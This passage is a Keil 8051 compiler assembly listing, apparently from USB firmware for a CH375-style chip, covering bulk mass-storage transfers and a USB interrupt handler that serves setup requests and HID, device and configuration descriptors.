00B8 FE                MOV     R6,A
00B9 FD                MOV     R5,A
00BA FC                MOV     R4,A
00BB 900000      R     MOV     DPTR,#LEN
00BE E0                MOVX    A,@DPTR
00BF F8                MOV     R0,A
00C0 A3                INC     DPTR
00C1 E0                MOVX    A,@DPTR
00C2 F9                MOV     R1,A
00C3 A3                INC     DPTR
00C4 E0                MOVX    A,@DPTR
00C5 FA                MOV     R2,A
00C6 A3                INC     DPTR
00C7 E0                MOVX    A,@DPTR
00C8 FB                MOV     R3,A
00C9 C3                CLR     C
00CA 120000      E     LCALL   ?C?ULCMP
00CD 7005              JNZ     ?C0238
                                           ; SOURCE LINE # 1192
                                           ; SOURCE LINE # 1193
00CF C200        R     CLR     CH375BULKDOWN
                                           ; SOURCE LINE # 1194
00D1 120000      R     LCALL   mCH375UpCsw
                                           ; SOURCE LINE # 1195
                                           ; SOURCE LINE # 1196
00D4         ?C0238:
00D4 22                RET     
             ; FUNCTION mCH375BulkDownData (END)

             ; FUNCTION USB_DeviceInterrupt (BEGIN)
0000 C0E0              PUSH    ACC
0002 C0F0              PUSH    B
0004 C083              PUSH    DPH
0006 C082              PUSH    DPL
0008 C0D0              PUSH    PSW
000A 75D008            MOV     PSW,#08H
                                           ; SOURCE LINE # 1202
                                           ; SOURCE LINE # 1208
000D 20D903            JB      UIF_TRANSFER,$ + 6H
0010 020000      R     LJMP    ?C0239
                                           ; SOURCE LINE # 1209
                                           ; SOURCE LINE # 1210
0013 E5D9              MOV     A,USB_INT_ST
0015 543F              ANL     A,#03FH
0017 7003              JNZ     $ + 5H
0019 020000      R     LJMP    ?C0321
001C 14                DEC     A
001D 602E              JZ      ?C0246
001F 24E1              ADD     A,#0E1H
0021 7003              JNZ     $ + 5H
0023 020000      R     LJMP    ?C0314
0026 24FE              ADD     A,#0FEH
0028 607A              JZ      ?C0258
002A 24F2              ADD     A,#0F2H
002C 7003              JNZ     $ + 5H
002E 020000      R     LJMP    ?C0259
0031 240F              ADD     A,#0FH
0033 6003              JZ      $ + 5H
0035 020000      R     LJMP    ?C0240
                                           ; SOURCE LINE # 1211
                                           ; SOURCE LINE # 1212
0038         ?C0241:
                                           ; SOURCE LINE # 1213
                                           ; SOURCE LINE # 1214
0038 300002            JNB     CH375BULKUP,?C0242
003B 8055              SJMP    ?C0389
003D         ?C0242:
                                           ; SOURCE LINE # 1215
003D 300002            JNB     CH375CSW,?C0244
0040 805C              SJMP    ?C0390
0042         ?C0244:
                                           ; SOURCE LINE # 1217
0042 E5D2              MOV     A,UEP1_CTRL
0044 54FC              ANL     A,#0FCH
0046 4402              ORL     A,#02H
0048 F5D2              MOV     UEP1_CTRL,A
                                           ; SOURCE LINE # 1218
004A 020000      R     LJMP    ?C0240
                                           ; SOURCE LINE # 1219
                                           ; SOURCE LINE # 1220
004D         ?C0246:
                                           ; SOURCE LINE # 1221
                                           ; SOURCE LINE # 1222
004D 20DE03            JB      U_TOG_OK,$ + 6H
0050 020000      R     LJMP    ?C0240
                                           ; SOURCE LINE # 1223
                                           ; SOURCE LINE # 1224
0053 300006            JNB     CH375BULKDOWN,?C0248
0056 120000      R     LCALL   mCH375BulkDownData
0059 020000      R     LJMP    ?C0240
005C         ?C0248:
                                           ; SOURCE LINE # 1226
                                           ; SOURCE LINE # 1227
005C 900000      R     MOV     DPTR,#len
005F E5DB              MOV     A,USB_RX_LEN
0061 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1228
0062 E0                MOVX    A,@DPTR
0063 7003              JNZ     $ + 5H
0065 020000      R     LJMP    ?C0240
                                           ; SOURCE LINE # 1229
;---- Variable 'i' assigned to Register 'R7' ----
0068 E4                CLR     A
0069 FF                MOV     R7,A
006A         ?C0251:
006A 900000      R     MOV     DPTR,#len
006D E0                MOVX    A,@DPTR
006E 6F                XRL     A,R7
006F 6015              JZ      ?C0252
                                           ; SOURCE LINE # 1230
0071 7400        R     MOV     A,#LOW Ep1Buffer
0073 2F                ADD     A,R7
0074 F582              MOV     DPL,A
0076 E4                CLR     A
0077 3400        R     ADDC    A,#HIGH Ep1Buffer
0079 F583              MOV     DPH,A
007B E0                MOVX    A,@DPTR
007C FE                MOV     R6,A
007D 7400        R     MOV     A,#LOW MassPara
007F 2F                ADD     A,R7
0080 F8                MOV     R0,A
0081 EE                MOV     A,R6
0082 F6                MOV     @R0,A
0083 0F                INC     R7
0084 80E4              SJMP    ?C0251
0086         ?C0252:
                                           ; SOURCE LINE # 1231
0086 120000      R     LCALL   mCH375BulkOnly
                                           ; SOURCE LINE # 1232
0089 300003      R     JNB     CH375BULKDOWN,$ + 6H
008C 020000      R     LJMP    ?C0240
                                           ; SOURCE LINE # 1233
                                           ; SOURCE LINE # 1234
008F 300006            JNB     CH375BULKUP,?C0255
0092         ?C0389:
0092 120000      R     LCALL   mCH375bulkUpData
0095 020000      R     LJMP    ?C0240
0098         ?C0255:
                                           ; SOURCE LINE # 1235
0098 300003      R     JNB     FSTALL,$ + 6H
009B 020000      R     LJMP    ?C0240
009E         ?C0390:
009E 120000      R     LCALL   mCH375UpCsw
                                           ; SOURCE LINE # 1237
                                           ; SOURCE LINE # 1238
                                           ; SOURCE LINE # 1239
                                           ; SOURCE LINE # 1240
00A1 020000      R     LJMP    ?C0240
                                           ; SOURCE LINE # 1241
                                           ; SOURCE LINE # 1242
00A4         ?C0258:
                                           ; SOURCE LINE # 1243
                                           ; SOURCE LINE # 1244
00A4 75D500            MOV     UEP2_T_LEN,#00H
                                           ; SOURCE LINE # 1245
00A7 E5D4              MOV     A,UEP2_CTRL
00A9 54FC              ANL     A,#0FCH
00AB 4402              ORL     A,#02H
00AD F5D4              MOV     UEP2_CTRL,A
                                           ; SOURCE LINE # 1246
00AF 900000      R     MOV     DPTR,#IsHIDDataSent
00B2 7401              MOV     A,#01H
00B4 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1247
00B5 020000      R     LJMP    ?C0240
                                           ; SOURCE LINE # 1248
                                           ; SOURCE LINE # 1249
00B8         ?C0259:
                                           ; SOURCE LINE # 1250
                                           ; SOURCE LINE # 1251
00B8 900000      R     MOV     DPTR,#len
00BB E5DB              MOV     A,USB_RX_LEN
00BD F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1252
00BE E0                MOVX    A,@DPTR
00BF 6408              XRL     A,#08H
00C1 6003              JZ      $ + 5H
00C3 020000      R     LJMP    ?C0260
                                           ; SOURCE LINE # 1253
                                           ; SOURCE LINE # 1254
00C6 900000      R     MOV     DPTR,#Ep0Buffer+06H
00C9 E0                MOVX    A,@DPTR
00CA 900000      R     MOV     DPTR,#SetupLen
00CD F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1255
00CE 900000      R     MOV     DPTR,#Ep0Buffer+07H
00D1 E0                MOVX    A,@DPTR
00D2 700D              JNZ     ?C0262
00D4 900000      R     MOV     DPTR,#SetupLen
00D7 E0                MOVX    A,@DPTR
00D8 D3                SETB    C
00D9 947F              SUBB    A,#07FH
00DB 7480              MOV     A,#080H
00DD 9480              SUBB    A,#080H
00DF 4006              JC      ?C0261
00E1         ?C0262:
                                           ; SOURCE LINE # 1256
                                           ; SOURCE LINE # 1257
00E1 900000      R     MOV     DPTR,#SetupLen
00E4 747F              MOV     A,#07FH
00E6 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1258
00E7         ?C0261:
                                           ; SOURCE LINE # 1259
00E7 900000      R     MOV     DPTR,#len
00EA E4                CLR     A
00EB F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1260
00EC 900000      R     MOV     DPTR,#Ep0Buffer
00EF E0                MOVX    A,@DPTR
00F0 5460              ANL     A,#060H
00F2 7003              JNZ     $ + 5H
00F4 020000      R     LJMP    ?C0263
                                           ; SOURCE LINE # 1261
                                           ; SOURCE LINE # 1262
00F7 A3                INC     DPTR
00F8 E0                MOVX    A,@DPTR
00F9 900000      R     MOV     DPTR,#SetupReqCode
00FC F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1263
00FD 64FE              XRL     A,#0FEH
00FF 6003              JZ      $ + 5H
0101 020000      R     LJMP    ?C0309
                                           ; SOURCE LINE # 1264
                                           ; SOURCE LINE # 1265
0104 900000      R     MOV     DPTR,#pDescr
0107 74FF              MOV     A,#0FFH
0109 F0                MOVX    @DPTR,A
010A A3                INC     DPTR
010B 7400        R     MOV     A,#HIGH MAX_LUN
010D F0                MOVX    @DPTR,A
010E A3                INC     DPTR
010F 7400        R     MOV     A,#LOW MAX_LUN
0111 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1266
0112 900000      R     MOV     DPTR,#len
0115 7401              MOV     A,#01H
0117 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1267
0118 900000      R     MOV     DPTR,#SetupLen
011B E0                MOVX    A,@DPTR
011C D3                SETB    C
011D 9401              SUBB    A,#01H
011F 4008              JC      ?C0265
                                           ; SOURCE LINE # 1268
                                           ; SOURCE LINE # 1269
0121 900000      R     MOV     DPTR,#len
0124 E0                MOVX    A,@DPTR
0125 900000      R     MOV     DPTR,#SetupLen
0128 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1270
0129         ?C0265:
                                           ; SOURCE LINE # 1271
0129 900000      R     MOV     DPTR,#SetupLen
012C E0                MOVX    A,@DPTR
012D FF                MOV     R7,A
012E C3                CLR     C
012F 9408              SUBB    A,#08H
0131 7480              MOV     A,#080H
0133 9480              SUBB    A,#080H
0135 4007              JC      ?C0266
0137 7E08              MOV     R6,#08H
0139 CF                XCH     A,R7
013A EE                MOV     A,R6
013B CF                XCH     A,R7
013C 8000              SJMP    ?C0267
013E         ?C0266:
013E         ?C0267:
013E 900000      R     MOV     DPTR,#len
0141 EF                MOV     A,R7
0142 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1272
0143 7E00              MOV     R6,#00H
0145 C8                XCH     A,R0
0146 7400        R     MOV     A,#LOW Ep0Buffer
0148 C8                XCH     A,R0
0149 CC                XCH     A,R4
014A 7400        R     MOV     A,#HIGH Ep0Buffer
014C CC                XCH     A,R4
014D CD                XCH     A,R5
014E 7401              MOV     A,#01H
0150 CD                XCH     A,R5
0151 900000      R     MOV     DPTR,#pDescr
0154 E0                MOVX    A,@DPTR
0155 FB                MOV     R3,A
0156 A3                INC     DPTR
0157 E0                MOVX    A,@DPTR
0158 FA                MOV     R2,A
0159 A3                INC     DPTR
015A E0                MOVX    A,@DPTR
015B F9                MOV     R1,A
015C 120000      E     LCALL   ?C?COPY
                                           ; SOURCE LINE # 1273
015F 900000      R     MOV     DPTR,#SetupLen
0162 E0                MOVX    A,@DPTR
0163 FF                MOV     R7,A
0164 900000      R     MOV     DPTR,#len
0167 E0                MOVX    A,@DPTR
0168 FE                MOV     R6,A
0169 C3                CLR     C
016A EF                MOV     A,R7
016B 9E                SUBB    A,R6
016C 900000      R     MOV     DPTR,#SetupLen
016F F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1274
0170 EE                MOV     A,R6
0171 FF                MOV     R7,A
0172 900000      R     MOV     DPTR,#pDescr+01H
0175 E4                CLR     A
0176 8FF0              MOV     B,R7
0178 120000      E     LCALL   ?C?IILDX
                                           ; SOURCE LINE # 1275
017B 900000      R     MOV     DPTR,#UsbReady
                                           ; SOURCE LINE # 1276
                                           ; SOURCE LINE # 1277
017E 020000      R     LJMP    ?C0394
0181         ?C0263:
                                           ; SOURCE LINE # 1279
                                           ; SOURCE LINE # 1280
0181 900000      R     MOV     DPTR,#Ep0Buffer+01H
0184 E0                MOVX    A,@DPTR
0185 900000      R     MOV     DPTR,#SetupReqCode
0188 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1281
0189 7003              JNZ     $ + 5H
018B 020000      R     LJMP    ?C0305
018E 14                DEC     A
018F 7003              JNZ     $ + 5H
0191 020000      R     LJMP    ?C0292
0194 24FC              ADD     A,#0FCH
0196 7003              JNZ     $ + 5H
0198 020000      R     LJMP    ?C0288
019B 24FD              ADD     A,#0FDH
019D 7003              JNZ     $ + 5H
019F 020000      R     LJMP    ?C0289
01A2 14                DEC     A
01A3 7003              JNZ     $ + 5H
01A5 020000      R     LJMP    ?C0291
01A8 14                DEC     A
01A9 7003              JNZ     $ + 5H
01AB 020000      R     LJMP    ?C0303
01AE 2404              ADD     A,#04H
01B0 6003              JZ      $ + 5H
01B2 020000      R     LJMP    ?C0308
                                           ; SOURCE LINE # 1282
                                           ; SOURCE LINE # 1283
01B5         ?C0270:
                                           ; SOURCE LINE # 1284
01B5 900000      R     MOV     DPTR,#Ep0Buffer+03H
01B8 E0                MOVX    A,@DPTR
01B9 24FE              ADD     A,#0FEH
01BB 6028              JZ      ?C0273
01BD 14                DEC     A
01BE 603B              JZ      ?C0274
01C0 24E1              ADD     A,#0E1H
01C2 7003              JNZ     $ + 5H
01C4 020000      R     LJMP    ?C0280
01C7 2421              ADD     A,#021H
01C9 6003              JZ      $ + 5H
01CB 020000      R     LJMP    ?C0284
                                           ; SOURCE LINE # 1285
                                           ; SOURCE LINE # 1286
01CE         ?C0272:
                                           ; SOURCE LINE # 1287
01CE 900000      R     MOV     DPTR,#pDescr
01D1 74FF              MOV     A,#0FFH
01D3 F0                MOVX    @DPTR,A
01D4 A3                INC     DPTR
01D5 7400        R     MOV     A,#HIGH MyDevDescr
01D7 F0                MOVX    @DPTR,A
01D8 A3                INC     DPTR
01D9 7400        R     MOV     A,#LOW MyDevDescr
01DB F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1288
01DC 900000      R     MOV     DPTR,#len
01DF 7412              MOV     A,#012H
01E1 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1289
01E2 020000      R     LJMP    ?C0271
                                           ; SOURCE LINE # 1290
01E5         ?C0273:
                                           ; SOURCE LINE # 1291
01E5 900000      R     MOV     DPTR,#pDescr
01E8 74FF              MOV     A,#0FFH
01EA F0                MOVX    @DPTR,A
01EB A3                INC     DPTR
01EC 7400        R     MOV     A,#HIGH MyCfgDescr
01EE F0                MOVX    @DPTR,A
01EF A3                INC     DPTR
01F0 7400        R     MOV     A,#LOW MyCfgDescr
01F2 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1292
01F3 900000      R     MOV     DPTR,#len
01F6 7439              MOV     A,#039H
01F8 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1293
01F9 8074              SJMP    ?C0271
                                           ; SOURCE LINE # 1294
01FB         ?C0274:
                                           ; SOURCE LINE # 1295
01FB 900000      R     MOV     DPTR,#Ep0Buffer+02H
01FE E0                MOVX    A,@DPTR
01FF 14                DEC     A
0200 601D              JZ      ?C0277
0202 14                DEC     A
0203 6030              JZ      ?C0278
0205 2402              ADD     A,#02H
0207 7060              JNZ     ?C0393
                                           ; SOURCE LINE # 1296
                                           ; SOURCE LINE # 1297
0209         ?C0276:
                                           ; SOURCE LINE # 1298
0209 900000      R     MOV     DPTR,#pDescr
020C 74FF              MOV     A,#0FFH
020E F0                MOVX    @DPTR,A
020F A3                INC     DPTR
0210 7400        R     MOV     A,#HIGH MyLangDescr
0212 F0                MOVX    @DPTR,A
0213 A3                INC     DPTR
0214 7400        R     MOV     A,#LOW MyLangDescr
0216 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1299
0217 900000      R     MOV     DPTR,#len
021A 7404              MOV     A,#04H
021C F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1300
021D 8050              SJMP    ?C0271
                                           ; SOURCE LINE # 1301
021F         ?C0277:
                                           ; SOURCE LINE # 1302
021F 900000      R     MOV     DPTR,#pDescr
0222 74FF              MOV     A,#0FFH
0224 F0                MOVX    @DPTR,A
0225 A3                INC     DPTR
0226 7400        R     MOV     A,#HIGH MyManuInfo
0228 F0                MOVX    @DPTR,A
0229 A3                INC     DPTR
022A 7400        R     MOV     A,#LOW MyManuInfo
022C F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1303
022D 900000      R     MOV     DPTR,#len
0230 740E              MOV     A,#0EH
0232 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1304
0233 803A              SJMP    ?C0271
                                           ; SOURCE LINE # 1305
0235         ?C0278:
                                           ; SOURCE LINE # 1306
0235 900000      R     MOV     DPTR,#pDescr
0238 74FF              MOV     A,#0FFH
023A F0                MOVX    @DPTR,A
023B A3                INC     DPTR
023C 7400        R     MOV     A,#HIGH MyProdInfo
023E F0                MOVX    @DPTR,A
023F A3                INC     DPTR
0240 7400        R     MOV     A,#LOW MyProdInfo
0242 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1307
0243 900000      R     MOV     DPTR,#len
0246 740C              MOV     A,#0CH
0248 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1308
0249 8024              SJMP    ?C0271
                                           ; SOURCE LINE # 1309
                                           ; SOURCE LINE # 1312
                                           ; SOURCE LINE # 1313
                                           ; SOURCE LINE # 1314
024B         ?C0280:
                                           ; SOURCE LINE # 1315
024B 900000      R     MOV     DPTR,#Ep0Buffer+02H
024E E0                MOVX    A,@DPTR
024F 7016              JNZ     ?C0283
                                           ; SOURCE LINE # 1316
                                           ; SOURCE LINE # 1317
0251         ?C0282:
                                           ; SOURCE LINE # 1318
0251 900000      R     MOV     DPTR,#pDescr
0254 74FF              MOV     A,#0FFH
0256 F0                MOVX    @DPTR,A
0257 A3                INC     DPTR
0258 7400        R     MOV     A,#HIGH HIDReportDescriptor
025A F0                MOVX    @DPTR,A
025B A3                INC     DPTR
025C 7400        R     MOV     A,#LOW HIDReportDescriptor
025E F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1319
025F 900000      R     MOV     DPTR,#len
0262 743F              MOV     A,#03FH
0264 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1320
0265 8008              SJMP    ?C0271
                                           ; SOURCE LINE # 1321
0267         ?C0283:
                                           ; SOURCE LINE # 1322
0267         ?C0392:
                                           ; SOURCE LINE # 1323
0267 8000              SJMP    ?C0393
                                           ; SOURCE LINE # 1324
                                           ; SOURCE LINE # 1325
                                           ; SOURCE LINE # 1326
0269         ?C0284:
                                           ; SOURCE LINE # 1327
0269         ?C0393:
0269 900000      R     MOV     DPTR,#len
026C 74FF              MOV     A,#0FFH
026E F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1328
                                           ; SOURCE LINE # 1329
026F         ?C0271:
                                           ; SOURCE LINE # 1330
026F 900000      R     MOV     DPTR,#len
0272 E0                MOVX    A,@DPTR
0273 FF                MOV     R7,A
0274 900000      R     MOV     DPTR,#SetupLen
0277 E0                MOVX    A,@DPTR
0278 D3                SETB    C
0279 9F                SUBB    A,R7
027A 4002              JC      ?C0285
                                           ; SOURCE LINE # 1331
                                           ; SOURCE LINE # 1332
027C EF                MOV     A,R7
027D F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1333
027E         ?C0285:
                                           ; SOURCE LINE # 1334
027E 900000      R     MOV     DPTR,#SetupLen
0281 E0                MOVX    A,@DPTR
0282 FF                MOV     R7,A
0283 C3                CLR     C
0284 9408              SUBB    A,#08H
0286 7480              MOV     A,#080H
0288 9480              SUBB    A,#080H
028A 4007              JC      ?C0286
028C 7E08              MOV     R6,#08H
028E CF                XCH     A,R7
028F EE                MOV     A,R6
0290 CF                XCH     A,R7
0291 8000              SJMP    ?C0287
0293         ?C0286:
0293         ?C0287:
0293 900000      R     MOV     DPTR,#len
0296 EF                MOV     A,R7
0297 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1335
0298 7E00              MOV     R6,#00H
029A C8                XCH     A,R0
029B 7400        R     MOV     A,#LOW Ep0Buffer
029D C8                XCH     A,R0
029E CC                XCH     A,R4
029F 7400        R     MOV     A,#HIGH Ep0Buffer
02A1 CC                XCH     A,R4
02A2 CD                XCH     A,R5
02A3 7401              MOV     A,#01H
02A5 CD                XCH     A,R5
02A6 900000      R     MOV     DPTR,#pDescr
02A9 E0                MOVX    A,@DPTR
02AA FB                MOV     R3,A
02AB A3                INC     DPTR
02AC E0                MOVX    A,@DPTR
02AD FA                MOV     R2,A
02AE A3                INC     DPTR
02AF E0                MOVX    A,@DPTR
02B0 F9                MOV     R1,A
02B1 120000      E     LCALL   ?C?COPY
                                           ; SOURCE LINE # 1336
02B4 900000      R     MOV     DPTR,#SetupLen
02B7 E0                MOVX    A,@DPTR
02B8 FF                MOV     R7,A
02B9 900000      R     MOV     DPTR,#len
02BC E0                MOVX    A,@DPTR
02BD FE                MOV     R6,A
02BE C3                CLR     C
02BF EF                MOV     A,R7
02C0 9E                SUBB    A,R6
02C1 900000      R     MOV     DPTR,#SetupLen
02C4 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1337
02C5 EE                MOV     A,R6
02C6 FF                MOV     R7,A
02C7 900000      R     MOV     DPTR,#pDescr+01H
02CA E4                CLR     A
02CB 8FF0              MOV     B,R7
02CD 120000      E     LCALL   ?C?IILDX
                                           ; SOURCE LINE # 1338
02D0 020000      R     LJMP    ?C0309
                                           ; SOURCE LINE # 1339
02D3         ?C0288:
                                           ; SOURCE LINE # 1340
02D3 900000      R     MOV     DPTR,#Ep0Buffer+02H
02D6 E0                MOVX    A,@DPTR
02D7 900000      R     MOV     DPTR,#SetupLen
02DA F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1341
02DB 020000      R     LJMP    ?C0309
                                           ; SOURCE LINE # 1342
02DE         ?C0289:
                                           ; SOURCE LINE # 1343
02DE 900000      R     MOV     DPTR,#UsbConfig
02E1 E0                MOVX    A,@DPTR
02E2 900000      R     MOV     DPTR,#Ep0Buffer
02E5 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1344
02E6 900000      R     MOV     DPTR,#SetupLen
02E9 E0                MOVX    A,@DPTR
02EA C3                CLR     C
02EB 9401              SUBB    A,#01H
02ED 7480              MOV     A,#080H
02EF 9480              SUBB    A,#080H
02F1 5003              JNC     $ + 5H
02F3 020000      R     LJMP    ?C0309
                                           ; SOURCE LINE # 1345
                                           ; SOURCE LINE # 1346
02F6 900000      R     MOV     DPTR,#len
02F9         ?C0391:
                                           ; SOURCE LINE # 1347
                                           ; SOURCE LINE # 1348
02F9 8076              SJMP    ?C0394
                                           ; SOURCE LINE # 1349
02FB         ?C0291:
                                           ; SOURCE LINE # 1350
02FB 900000      R     MOV     DPTR,#Ep0Buffer+02H
02FE E0                MOVX    A,@DPTR
02FF 900000      R     MOV     DPTR,#UsbConfig
0302 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1351
0303 7BFF              MOV     R3,#0FFH
0305 7A00        R     MOV     R2,#HIGH ?SC_52
0307 7900        R     MOV     R1,#LOW ?SC_52
0309 120000      E     LCALL   _printf
                                           ; SOURCE LINE # 1352
030C 020000      R     LJMP    ?C0309
                                           ; SOURCE LINE # 1353
030F         ?C0292:
                                           ; SOURCE LINE # 1354
030F 900000      R     MOV     DPTR,#Ep0Buffer
0312 E0                MOVX    A,@DPTR
0313 541F              ANL     A,#01FH
0315 6402              XRL     A,#02H
0317 7041              JNZ     ?C0293
                                           ; SOURCE LINE # 1355
                                           ; SOURCE LINE # 1356
0319 900000      R     MOV     DPTR,#Ep0Buffer+04H
031C E0                MOVX    A,@DPTR
031D 14                DEC     A
031E 6029              JZ      ?C0299
0320 14                DEC     A
0321 6011              JZ      ?C0296
0323 2481              ADD     A,#081H
0325 6012              JZ      ?C0297
0327 14                DEC     A
0328 7030              JNZ     ?C0396
                                           ; SOURCE LINE # 1357
                                           ; SOURCE LINE # 1358
032A         ?C0295:
                                           ; SOURCE LINE # 1359
032A E5D4              MOV     A,UEP2_CTRL
032C 54BC              ANL     A,#0BCH
032E 4402              ORL     A,#02H
0330 F5D4              MOV     UEP2_CTRL,A
                                           ; SOURCE LINE # 1360
0332 806B              SJMP    ?C0309
                                           ; SOURCE LINE # 1361
0334         ?C0296:
                                           ; SOURCE LINE # 1362
0334 53D473            ANL     UEP2_CTRL,#073H
                                           ; SOURCE LINE # 1363
0337 8066              SJMP    ?C0309
                                           ; SOURCE LINE # 1364
0339         ?C0297:
                                           ; SOURCE LINE # 1365
0339 E5D2              MOV     A,UEP1_CTRL
033B 54BC              ANL     A,#0BCH
033D 4402              ORL     A,#02H
033F F5D2              MOV     UEP1_CTRL,A
                                           ; SOURCE LINE # 1366
0341 30000E            JNB     CH375CSW,?C0395
0344 120000      R     LCALL   mCH375UpCsw
0347         ?C0298:
                                           ; SOURCE LINE # 1367
                                           ; SOURCE LINE # 1368
                                           ; SOURCE LINE # 1369
0347 8009              SJMP    ?C0395
                                           ; SOURCE LINE # 1370
0349         ?C0299:
                                           ; SOURCE LINE # 1371
0349 53D273            ANL     UEP1_CTRL,#073H
                                           ; SOURCE LINE # 1372
034C 300003            JNB     CH375CSW,?C0300
034F 120000      R     LCALL   mCH375UpCsw
0352         ?C0300:
                                           ; SOURCE LINE # 1373
0352         ?C0395:
0352 A200        R     MOV     C,FSTALL
0354 9200        R     MOV     lastFSTALL,C
                                           ; SOURCE LINE # 1374
0356 C200        R     CLR     FSTALL
                                           ; SOURCE LINE # 1375
0358 8045              SJMP    ?C0309
                                           ; SOURCE LINE # 1376
                                           ; SOURCE LINE # 1379
                                           ; SOURCE LINE # 1380
035A         ?C0293:
                                           ; SOURCE LINE # 1382
                                           ; SOURCE LINE # 1383
035A         ?C0396:
                                           ; SOURCE LINE # 1384
                                           ; SOURCE LINE # 1385
035A 803D              SJMP    ?C0398
                                           ; SOURCE LINE # 1386
035C         ?C0303:
                                           ; SOURCE LINE # 1387
035C 900000      R     MOV     DPTR,#Ep0Buffer
035F E4                CLR     A
0360 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1388
0361 900000      R     MOV     DPTR,#SetupLen
0364 E0                MOVX    A,@DPTR
0365 C3                CLR     C
0366 9401              SUBB    A,#01H
0368 7480              MOV     A,#080H
036A 9480              SUBB    A,#080H
036C 4031              JC      ?C0309
                                           ; SOURCE LINE # 1389
                                           ; SOURCE LINE # 1390
036E 900000      R     MOV     DPTR,#len
0371         ?C0394:
0371 7401              MOV     A,#01H
0373 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1391
                                           ; SOURCE LINE # 1392
0374 8029              SJMP    ?C0309
                                           ; SOURCE LINE # 1393
0376         ?C0305:
                                           ; SOURCE LINE # 1394
0376 900000      R     MOV     DPTR,#Ep0Buffer
0379 E4                CLR     A
037A F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1395
037B A3                INC     DPTR
037C F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1396
037D 900000      R     MOV     DPTR,#SetupLen
0380 E0                MOVX    A,@DPTR
0381 FF                MOV     R7,A
0382 C3                CLR     C
0383 9402              SUBB    A,#02H
0385 7480              MOV     A,#080H
0387 9480              SUBB    A,#080H
0389 900000      R     MOV     DPTR,#len
038C 4005              JC      ?C0306
                                           ; SOURCE LINE # 1397
                                           ; SOURCE LINE # 1398
038E 7402              MOV     A,#02H
0390 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1399
0391 800C              SJMP    ?C0309
0393         ?C0306:
                                           ; SOURCE LINE # 1401
                                           ; SOURCE LINE # 1402
0393 EF                MOV     A,R7
0394 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1403
                                           ; SOURCE LINE # 1404
0395 8008              SJMP    ?C0309
                                           ; SOURCE LINE # 1405
0397         ?C0308:
                                           ; SOURCE LINE # 1406
0397         ?C0397:
                                           ; SOURCE LINE # 1407
0397 8000              SJMP    ?C0398
                                           ; SOURCE LINE # 1408
                                           ; SOURCE LINE # 1409
                                           ; SOURCE LINE # 1410
0399         ?C0260:
                                           ; SOURCE LINE # 1412
                                           ; SOURCE LINE # 1413
0399         ?C0398:
0399 900000      R     MOV     DPTR,#len
039C 74FF              MOV     A,#0FFH
039E F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1414
039F         ?C0309:
                                           ; SOURCE LINE # 1416
039F 900000      R     MOV     DPTR,#len
03A2 E0                MOVX    A,@DPTR
03A3 FF                MOV     R7,A
03A4 7E00              MOV     R6,#00H
03A6 F4                CPL     A
03A7 700C              JNZ     ?C0310
                                           ; SOURCE LINE # 1417
                                           ; SOURCE LINE # 1418
03A9 900000      R     MOV     DPTR,#SetupReqCode
03AC 74FF              MOV     A,#0FFH
03AE F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1419
03AF 75DCCF            MOV     UEP0_CTRL,#0CFH
                                           ; SOURCE LINE # 1420
03B2 020000      R     LJMP    ?C0240
03B5         ?C0310:
                                           ; SOURCE LINE # 1421
03B5 D3                SETB    C
03B6 EF                MOV     A,R7
03B7 9408              SUBB    A,#08H
03B9 EE                MOV     A,R6
03BA 6480              XRL     A,#080H
03BC 9480              SUBB    A,#080H
03BE 5008              JNC     ?C0312
                                           ; SOURCE LINE # 1422
                                           ; SOURCE LINE # 1423
03C0 900000      R     MOV     DPTR,#len
03C3 E0                MOVX    A,@DPTR
03C4 F5DD              MOV     UEP0_T_LEN,A
                                           ; SOURCE LINE # 1424
                                           ; SOURCE LINE # 1425
03C6 8003              SJMP    ?C0399
03C8         ?C0312:
                                           ; SOURCE LINE # 1427
                                           ; SOURCE LINE # 1428
03C8 75DD00            MOV     UEP0_T_LEN,#00H
                                           ; SOURCE LINE # 1429
03CB         ?C0399:
03CB 75DCC0            MOV     UEP0_CTRL,#0C0H
                                           ; SOURCE LINE # 1430
                                           ; SOURCE LINE # 1431
03CE 020000      R     LJMP    ?C0240
                                           ; SOURCE LINE # 1432
                                           ; SOURCE LINE # 1433
03D1         ?C0314:
                                           ; SOURCE LINE # 1434
                                           ; SOURCE LINE # 1435
03D1 900000      R     MOV     DPTR,#SetupReqCode
